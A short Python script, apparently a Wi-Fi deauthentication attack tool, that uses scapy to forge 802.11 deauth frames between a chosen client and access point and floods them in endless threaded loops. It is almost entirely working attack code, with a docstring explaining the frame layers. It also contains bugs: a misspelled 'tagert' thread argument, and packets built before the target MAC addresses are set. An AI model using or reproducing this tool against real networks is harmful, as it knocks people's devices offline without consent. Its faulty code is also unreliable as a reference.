from scapy.all import *
import os
import sys

### Client MAC address
from scapy.layers.dot11 import RadioTap, Dot11Deauth, Dot11

client = ""
### AP MAC address
ap = ""
### Interafce name 
interface = "wlo1"

'''
RadioTap()/Dot11(...)/Dot11Deauth() 
addr1: destination MAC address
addr2: source MAC address
addr3: BSSID - AP MAC address
RadioTap is making it easier to transmit information between OSI layers
Dot11 represent the MAC header in the Data Link Layer, it is the abbreviated specification name 802.11
Dot11Deauth represent deauthentication packet
/ - operator that used as a composition operator between two layers
'''

dot11_to_client = Dot11(addr1=client, addr2=ap, addr3=ap)
dot11_to_ap = Dot11(addr1=ap, addr2=client, addr3=ap)

### Deauthentication packet from AP to client.
pkt_to_client = RadioTap() / dot11_to_client / Dot11Deauth(reason=1)

### Deauthentication packet from client to AP.
pkt_to_ap = RadioTap() / dot11_to_ap / Dot11Deauth(reason=1)

def client_to_ap():
    while True:
        print("Sending deauthentication packet from client to AP")
        sendp(pkt_to_ap, inter=0.1, count=100, iface=interface, verbose=1)


def ap_to_client():
    while True:
        print("Sending deauthentication packet from AP to client")
        sendp(pkt_to_client, inter=0.1, count=100, iface=interface, verbose=1)

    

# count=100
def start(client_mac, ap_mac):
    global client
    global ap 
    
    client = client_mac
    ap = ap_mac
    
    deauth1 = Thread(tagert=ap_to_client)
    deauth1.daemon = True
    
    deauth2 = Thread(target=client_to_ap)
    deauth2.daemon = True
    
    deauth1.start()
    deauth2.start()